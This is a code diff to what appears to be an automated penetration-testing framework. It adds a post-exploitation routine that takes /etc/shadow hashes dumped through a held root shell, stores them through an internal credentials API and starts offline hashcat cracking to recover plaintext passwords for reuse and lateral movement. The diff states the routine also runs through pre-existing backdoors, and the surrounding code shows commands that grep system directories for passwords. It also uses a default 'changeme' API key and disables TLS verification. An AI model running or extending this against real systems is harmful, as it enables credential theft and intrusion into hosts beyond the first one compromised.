@@ -1928,6 +1928,18 @@ def post_enumeration(state: PentestState) -> dict:
             if stp["ok"] and stp["output"].strip():
                 _msg(sid, "PostEnumeration",
                      f"[{stp['title']}] {stp['command']}\n{stp['output'][:900]}")
+        # Turn the dumped /etc/shadow into cracked, reusable passwords — a root
+        # shell that only prints hashes has done half the job.
+        loot = _harvest_shell_loot(sid, target, through.get("steps"))
+        if loot.get("hashes"):
+            findings.append(
+                f"post_enumeration: harvested {loot['hashes']} /etc/shadow hash(es) "
+                f"from the held shell → stored {loot.get('stored', 0)}, cracked "
+                f"{loot.get('cracked', 0)} to plaintext (credential reuse enabled)")
+            _msg(sid, "PostEnumeration",
+                 f"[loot] /etc/shadow: {loot['hashes']} hash(es) harvested, "
+                 f"{loot.get('cracked', 0)} cracked to plaintext via offline hashcat "
+                 f"— stored as credentials for reuse/lateral movement.")
     elif through.get("reason"):
         findings.append(f"post_enumeration: {through['reason']}")
 
@@ -2193,6 +2205,59 @@ _POSTEX_INFO_COMMANDS = [
      "-e password -e passwd -e secret /var/www /etc 2>/dev/null | head -20"),
     ("procs", "Running processes", "ps aux 2>/dev/null || ps -ef 2>/dev/null"),
 ]
+
+
+def _harvest_shell_loot(sid, target: str, steps: list) -> dict:
+    """Turn a held shell's ALREADY-DUMPED /etc/shadow into usable passwords.
+
+    _enumerate_through_best_access dumps /etc/shadow (readable only as root) but
+    only ever posted it as a message — the hashes were never parsed, stored, or
+    cracked, so a ROOT shell produced zero reusable credentials. This closes that
+    loop: parse the shadow hashes we already hold, store them as crackable
+    credential_findings, and fire the offline hashcat crack in the exploit-runner
+    (which then stores the plaintext, feeding the credential-reuse / lateral
+    path). Runs for any held shell, including a pre-existing backdoor that no
+    exploit opened (so /postex/enumerate was never auto-fired for it).
+
+    Best-effort; never raises into the enumeration."""
+    out = {"hashes": 0, "stored": 0, "cracked": 0}
+    try:
+        import re as _re
+        import requests as _rq
+        by_id = {stp.get("step"): (stp.get("output") or "") for stp in (steps or [])}
+        shadow = by_id.get("shadow", "")
+        # user:$id$salt$hash: — crypt hashes only ($1/$5/$6/$2y/$y ...)
+        rows = _re.findall(r"(?im)^([a-z_][a-z0-9_-]*):(\$[0-9a-z]{1,2}\$[^:\s]+):", shadow)
+        if not rows:
+            return out
+        out["hashes"] = len(rows)
+        rag = os.environ.get("RAG_API_URL") or "https://rag-api:8000"
+        er = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")
+        api_key = os.environ.get("API_KEY", "changeme")
+        for user, h in rows:
+            try:
+                r = _rq.post(f"{rag}/credentials",
+                             params={"ip": target, "port": 22, "protocol": "ssh",
+                                     "username": user, "secret_value": h,
+                                     "secret_type": "hash", "status": "unknown",
+                                     "source": "postex:shadow"},
+                             headers={"x-api-key": api_key}, timeout=10, verify=False)
+                if r.status_code < 400:
+                    out["stored"] += 1
+            except Exception:  # noqa: BLE001
+                pass
+        # Offline crack (exploit-runner holds hashcat + the wordlist mount). It
+        # reads the hashes we just stored, cracks, and stores the plaintext.
+        try:
+            r = _rq.post(f"{er}/crack/{target}",
+                         headers={"x-api-key": api_key}, timeout=600, verify=False)
+            d = r.json() if r.status_code < 400 else {}
+            out["cracked"] = d.get("cracked", 0)
+        except Exception as e:  # noqa: BLE001
+            out["crack_error"] = str(e)[:160]
+    except Exception as e:  # noqa: BLE001
+        out["error"] = str(e)[:160]
+    return out
 
 
 def _enumerate_through_best_access(sid, target: str) -> dict:
